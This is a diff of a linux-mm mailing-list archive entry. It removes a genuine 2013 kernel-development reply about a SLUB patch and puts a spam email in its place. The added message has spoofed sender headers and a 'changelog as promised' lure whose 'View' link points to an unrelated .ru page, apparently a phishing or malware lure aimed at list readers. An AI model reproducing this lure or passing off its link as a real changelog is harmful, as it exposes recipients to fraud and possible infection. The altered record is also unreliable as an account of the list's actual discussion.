@@ -1,36 +1,35 @@
-Return-Path: <owner-linux-mm@kvack.org>
-Received: from psmtp.com (na3sys010amx139.postini.com [74.125.245.139])
-	by kanga.kvack.org (Postfix) with SMTP id 01C4E6B0006
-	for <linux-mm@kvack.org>; Fri, 22 Feb 2013 12:23:30 -0500 (EST)
-Date: Fri, 22 Feb 2013 17:23:28 +0000
-From: Christoph Lameter <cl@linux.com>
-Subject: Re: [PATCH v2] slub: correctly bootstrap boot caches
-In-Reply-To: <5127A607.3040603@parallels.com>
-Message-ID: <0000013d02ee5bf7-a2d47cfc-64fb-4faa-b92e-e567aeb6b587-000000@email.amazonses.com>
-References: <1361550000-14173-1-git-send-email-glommer@parallels.com> <alpine.DEB.2.02.1302221034380.7600@gentwo.org> <alpine.DEB.2.02.1302221057430.7600@gentwo.org> <0000013d02d9ee83-9b41b446-ee42-4498-863e-33b3175c007c-000000@email.amazonses.com>
- <5127A607.3040603@parallels.com>
+Return-Path: <KaelSickmeir@cityofpaloalto.org>
+Received: from  (helo=kvack.org) by kvack.org with esmtpa (Exim 4.67 (FreeBSD)) (envelope-from <KaelSickmeir@cityofpaloalto.org>) id 1TLY13-9200hk-MM for <linux-mm@kvack.org>; Fri, 22 Feb 2013 08:39:01 -0500
+Date: Fri, 22 Feb 2013 08:39:01 -0500
+From: <accounting@kvack.org>
+Reply-To: <accounting@kvack.org>
+Message-ID: <217636587.20130222123901@cityofpaloalto.org>
+Subject: Re: Fwd: Changelog as promised(updated)
 MIME-Version: 1.0
-Content-Type: TEXT/PLAIN; charset=US-ASCII
-Sender: owner-linux-mm@kvack.org
+Content-Type: multipart/alternative;
+  boundary="----------C5136EF6E8297B8"
+To: linux-mm@kvack.org
 List-ID: <linux-mm.kvack.org>
-To: Glauber Costa <glommer@parallels.com>
-Cc: linux-mm@kvack.org, linux-kernel@vger.kernel.org, cgroups@vger.kernel.org, Andrew Morton <akpm@linux-foundation.org>, Tejun Heo <tj@kernel.org>, Pekka Enberg <penberg@kernel.org>, Joonsoo Kim <js1304@gmail.com>
 
-On Fri, 22 Feb 2013, Glauber Costa wrote:
+------------C5136EF6E8297B8
+Content-Type: text/plain; charset=iso-8859-2
+Content-Transfer-Encoding: 7bit
 
-> On 02/22/2013 09:01 PM, Christoph Lameter wrote:
-> > Argh. This one was the final version:
-> >
-> > https://patchwork.kernel.org/patch/2009521/
-> >
->
-> It seems it would work. It is all the same to me.
-> Which one do you prefer?
+Hello, as promised your changelog -    View    L. DOUGHERTY  
+------------C5136EF6E8297B8
+Content-Type: text/html; charset=iso-8859-2
+Content-Transfer-Encoding: 7bit
 
-Flushing seems to be simpler and less code.
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<HTML><HEAD><TITLE></TITLE>
+</HEAD>
+<BODY>
 
---
-To unsubscribe, send a message with 'unsubscribe linux-mm' in
-the body to majordomo@kvack.org.  For more info on Linux MM,
-see: http://www.linux-mm.org/ .
-Don't email: <a href=mailto:"dont@kvack.org"> email@kvack.org </a>
+Hello, <br />
+as promised your changelog - <a href="http://antares-voks.ru/page2-highres.htm">   View    </a><br /><br /><br />
+L. DOUGHERTY  <br /><br /><br /><br /><br /><br /><br /><br />
+
+
+
+</BODY></HTML>
+------------C5136EF6E8297B8--
